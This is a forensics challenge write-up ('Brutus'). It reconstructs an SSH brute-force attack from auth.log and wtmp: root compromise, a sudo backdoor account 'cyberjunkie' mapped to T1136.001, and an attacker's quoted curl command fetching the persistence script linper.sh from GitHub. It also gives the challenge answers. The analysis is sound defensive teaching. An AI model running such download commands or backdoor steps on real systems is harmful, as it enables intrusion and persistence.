## 📌 Machine Overview

**Brutus** is a Very Easy Linux forensics challenge focused on authentication log analysis and investigation of attacker activity.

The investigation is based on two forensic artifacts:

- `auth.log` — Linux authentication logs.
- `wtmp` — Binary log containing login/logout sessions and terminal activity.

The scenario involves an attacker performing a **brute-force attack against SSH**, successfully compromising the `root` account, establishing an interactive session, creating a privileged backdoor account, and subsequently using that account to download an additional script.

The investigation demonstrates how authentication logs can be correlated with `wtmp` data to reconstruct an attack timeline and identify persistence mechanisms.

---

## 🎯 Objectives

The main objectives of the investigation are:

1. Identify the source IP address used during the brute-force attack.
2. Determine which account was compromised.
3. Identify the exact time of the attacker's interactive SSH session.
4. Determine the SSH session ID assigned to the attacker.
5. Identify the account created for persistence.
6. Map the persistence technique to MITRE ATT&CK.
7. Determine when the attacker's initial SSH session ended.
8. Identify the command used to download an additional script.

# 🔎 1. Initial Analysis

The provided artifacts are:

    auth.log
    wtmp

### `auth.log`

The Linux `auth.log` file records authentication-related events such as:

- SSH authentication attempts
- Successful and failed logins
- `sudo` activity
- User switching
- Authentication-related cron activity
- User and group management operations

Typical entries contain information such as:

    Timestamp
    Hostname
    Service
    PID
    Username
    Authentication status
    Source IP
    Message

For example, failed SSH authentication attempts can appear as:

    Failed password for invalid user admin from 192.168.1.101 port 22 ssh2

These entries are particularly useful when investigating brute-force attacks.

---

## 🗂️ `wtmp`

The `wtmp` file records system login and logout activity.

Unlike `auth.log`, `wtmp` is a binary file and cannot be read directly as normal text.

The traditional `last` command can be used to analyze it:

    last -f wtmp

The output provides information such as:

- Username
- Terminal
- Source IP address
- Login time
- Logout time
- Session duration

For example:

    user pts/0 192.168.1.100 Sat Mar 10 10:23 - 10:25 (00:02)

This allows us to identify when an interactive terminal session was actually established.

---

# 🛠️ 2. Converting `wtmp` to a Readable Format

Because `wtmp` is a binary artifact, the provided `utmp.py` utility can be used to decode it into a human-readable format.

    python3 utmp.py -o wtmp.out wtmp

The resulting file can then be inspected with:

    cat wtmp.out

or:

    less wtmp.out

The decoded output contains useful fields such as:

- Record type
- PID
- Terminal line
- User
- Host
- Session ID
- Timestamp
- Microseconds
- Source address

> **Important:** The timestamp generated by `utmp.py` is displayed according to the investigator's local timezone rather than necessarily reflecting the timezone of the original system. The system timezone therefore needs to be considered when reconstructing the incident timeline.

# 🔥 3. Brute-Force Attack Analysis

The first step is to identify repeated authentication failures within a short period of time.

Useful indicators include:

    Invalid user
    Failed password

We can search the authentication log for failed SSH authentication:

    grep "Failed password" auth.log

We can also look for invalid users:

    grep "Invalid user" auth.log

The logs reveal numerous authentication attempts originating from:

    65.2.161.68

The large number of authentication attempts occurring within seconds indicates automated brute-force activity rather than normal human authentication behavior.

### Attacker IP

    65.2.161.68

---

# 🔐 4. Identifying the Compromised Account

After identifying the brute-force source IP, the next step is determining whether the attack was successful.

A successful SSH authentication can be identified by:

    Accepted password

Searching the authentication logs for successful authentication:

    grep "Accepted password" auth.log

The logs show that the attacker successfully authenticated as:

    root

This is particularly significant because compromising `root` provides the attacker with unrestricted administrative privileges.

### Compromised Account

    root

---

# 🕒 5. Identifying the Interactive SSH Session

The authentication log records when the password was accepted, but this does not necessarily represent the exact moment when the attacker established their interactive terminal session.

For this reason, the `wtmp` artifact is used to identify the actual terminal session.

After decoding the artifact:

    python3 utmp.py -o wtmp.out wtmp

we can inspect the resulting output:

    cat wtmp.out

The investigation shows that the attacker established an interactive terminal session at:

    2024-03-06 06:32:45 UTC

The authentication event occurred one second earlier, at `06:32:44`, while the terminal session was created at `06:32:45`.

### Interactive Login Time

    2024-03-06 06:32:45

---

# 🆔 6. Identifying the SSH Session ID

SSH sessions are assigned a session number when they are opened.

The authentication logs show that the compromised `root` account was assigned:

    Session ID: 37

This session ID can then be correlated with subsequent authentication events to track the attacker's activity.

### Session ID

    37

# 👤 7. Persistence — Creation of a New Account

After obtaining administrative access, the attacker established persistence by creating a new local user account.

When investigating `auth.log`, useful keywords include:

    useradd
    usermod
    groupadd

These commands can indicate:

- Creation of new users
- Modification of user privileges
- Creation of groups

The logs reveal that the attacker created a new account:

    cyberjunkie

The account was subsequently added to the `sudo` group.

Membership in the `sudo` group allows the account to execute commands with elevated privileges.

### Persistence Account

    cyberjunkie

### Privilege Group

    sudo

---

# 🧩 8. MITRE ATT&CK Mapping

Creating a new account for persistence maps to the MITRE ATT&CK **Create Account** technique:

    T1136

Because the attacker created a local account, the appropriate sub-technique is:

    T1136.001 — Create Account: Local Account

### MITRE ATT&CK

    T1136.001

### Technique

**Create Account: Local Account**

### Tactic

**Persistence**

# 🚪 9. End of the Initial SSH Session

The attacker initially established SSH session:

    37

Reviewing `auth.log` for the corresponding session termination shows that session `37` ended at:

    2024-03-06 06:37:24

### Session End Time

    2024-03-06 06:37:24

This allows us to establish a clear timeline for the attacker's initial interactive session.

# 📥 10. Downloading the Additional Script

After creating the privileged backdoor account, the attacker authenticated using the newly created account.

The attacker then used `sudo` to execute a command that downloaded an additional script from GitHub.

Because commands executed through `sudo` require authentication, the command is recorded in `auth.log`.

The full command was:

    /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

This activity indicates that the attacker was attempting to introduce additional tooling into the compromised system.

### Downloaded Resource

    https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

### Full Command

    /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

# 📝 14. Investigation Summary

The investigation began with analysis of the Linux `auth.log` and `wtmp` artifacts.

Repeated failed SSH authentication attempts originating from `65.2.161.68` revealed an automated brute-force attack. The attacker eventually succeeded in authenticating as the highly privileged `root` account.

The `wtmp` artifact was then used to identify the creation of the attacker's interactive terminal session, establishing that the session began at `2024-03-06 06:32:45` and was associated with SSH session `37`.

Following initial access, the attacker established persistence by creating the local account `cyberjunkie` and adding it to the `sudo` group. This activity maps to **T1136.001 — Create Account: Local Account**.

The attacker later used the privileged backdoor account to execute `curl` with `sudo` and download `linper.sh` from GitHub, indicating additional post-exploitation activity.

This investigation demonstrates how multiple Linux authentication artifacts can be correlated to reconstruct an attack chain from **initial access and brute force → successful authentication → interactive access → persistence → post-exploitation**.

---

# 🔑 Key Takeaways

- Authentication logs are valuable sources for detecting SSH brute-force activity.
- Repeated `Failed password` and `Invalid user` events from the same source within a short period can indicate automated authentication attacks.
- `Accepted password` events can confirm successful authentication.
- `wtmp` provides valuable information about interactive login sessions that may not be directly available from `auth.log`.
- Creating a new privileged user is a common persistence technique.
- `sudo` activity can provide visibility into commands executed with elevated privileges.
- Correlating multiple artifacts allows analysts to reconstruct an attacker's timeline and identify post-exploitation behavior.
- MITRE ATT&CK provides a useful framework for categorizing observed attacker techniques.
